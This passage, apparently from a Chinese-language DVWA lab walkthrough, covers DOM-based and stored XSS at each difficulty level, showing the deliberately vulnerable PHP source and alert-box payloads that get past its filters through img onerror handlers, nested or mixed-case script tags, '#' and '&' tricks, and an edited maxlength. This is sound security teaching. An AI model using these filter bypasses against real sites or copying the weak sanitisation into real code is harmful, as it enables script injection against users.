?default=English <script>alert('XSS')</script>
```

### Medium

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

对`default`变量进行了过滤，通过`stripos()` 函数查找`<script`字符串在`default`变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过`location`将URL后面的参数修正为`?default=English`，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。



闭合`</option>`和`</select>`，然后使用`img`标签通过事件来弹窗

```javascript
?default=English</option></select><img src=x onerror=alert('XSS')>
```

直接利用`input`的事件来弹窗

```none
?default=English<input onclick=alert('XSS') />
```

### High

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

使用了白名单模式，如果`default`的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为:`?default=English` ，这里只是对 default 的变量进行了过滤。

可以使用`&`连接另一个自定义变量来Bypass

```none
?default=English&a=</option></select><img src=x onerror=alert('XSS')>
?default=English&a=<input onclick=alert('XSS') />
```

也可以使用`#`来Bypass

```none
?default=English#</option></select><img src=x onerror=alert('XSS')>
?default=English#<input onclick=alert('XSS') />
```

### Impossible

```php
# For the impossible level, don't decode the querystring
$decodeURI = "decodeURI";
if ($vulnerabilityFile == 'impossible.php') {
    $decodeURI = "";
}
```

`Impossible` 级别直接不对我们的输入参数进行 URL 解码了，这样会导致标签失效，从而无法XSS

## 存储型XSS  

### Low

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

```javascript
Name: z3eyond
Message: <script>alert('XSS')</script>
```

#### trim

```php
trim(string,charlist)
```

**细节**

移除string字符两侧的预定义字符。

| 参数     | 描述                             |
| :------- | :------------------------------- |
| string   | 必需。规定要检查的字符串。       |
| charlist | 可选。规定从字符串中删除哪些字符 |

`charlist`如果被省略，则移除以下所有字符：

| 符合 | 解释       |
| :--- | :--------- |
| \0   | NULL       |
| \t   | 制表符     |
| \n   | 换行       |
| \x0B | 垂直制表符 |
| \r   | 回车       |
|      | 空格       |

### stripslashes



```php
stripslashes(string)
```

**细节**

去除掉string字符的反斜杠`\`，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。

### mysql_real_escape_string

**语法**



```php
mysql_real_escape_string(string,connection)
```

**细节**

转义 SQL 语句中使用的字符串中的特殊字符。

| 参数       | 描述                                                  |
| :--------- | :---------------------------------------------------- |
| string     | 必需。规定要转义的字符串。                            |
| connection | 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 |

下列字符受影响：

- \x00
- \n
- \r
- \
- ‘
- “
- \x1a

以上这些函数都只是对数据库进行了防护，却没有考虑到对XSS进行过滤，所以依然可以正常的来XSS

### Medium

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```



```javascript
Name: <img src=x onerror=alert('XSS')>
Message: www.z3eyond.com
```

可以看到我们的payload直接插入到了数据库中了：

因为`name`过滤规则的缺陷，同样使用**嵌套构造**和**大小写转换**也是可以 Bypass 的：



```javascript
Name: <Script>alert('XSS')</script>
Message:www.z3eyond.com

Name: <s<script>cript>alert('XSS')</script>
Message:www.z3eyond.com
```

### strip_tags

```php
strip_tags(string,allow)
```

**细节**

剥去字符串中的 HTML、XML 以及 PHP 的标签。

| 参数     | 描述                                       |
| :------- | :----------------------------------------- |
| *string* | 必需。规定要检查的字符串。                 |
| *allow*  | 可选。规定允许的标签。这些标签不会被删除。 |

### htmlspecialchars

```php
htmlspecialchars(string,flags,character-set,double_encode)
```

**细节**

把预定义的字符转换为 HTML 实体。

预定义的字符是：

- & （和号）成为 `&`
- “ （双引号）成为 `"`
- ‘ （单引号）成为` '`
- < （小于）成为 `<`
- \> （大于）成为 `>`

`message` 变量几乎把所有的XSS都给过滤了，但是`name`变量只是过滤了标签而已，我们依然可以在`name`参数尝试使用其他的标签配合事件来触发弹窗。

`name`的input输入文本框限制了长度：

```html
<input name="txtName" size="30" maxlength="10" type="text">
```

审查元素手动将`maxlength`的值调大一点就可以了。

```html
<input name="txtName" size="50" maxlength="50" type="text">
```

### High

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

`message`变量依然是没有什么希望，重点分析下`name`变量，发现仅仅使用了如下规则来过滤，所以依然可以使用其他的标签来Bypass,不用script：

```javascript
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```

```javascript
Name: <img src=x onerror=alert('XSS')>
Message: www.sqlsec.com
```

### Impossible



```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

`message`和`name`变量都进行了严格的过滤，而且还检测了用户的token：



```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```

有效地防止了 CSRF 的攻击

##  参考文章

https://www.sqlsec.com/2020/05/dvwa.html#toc-heading-18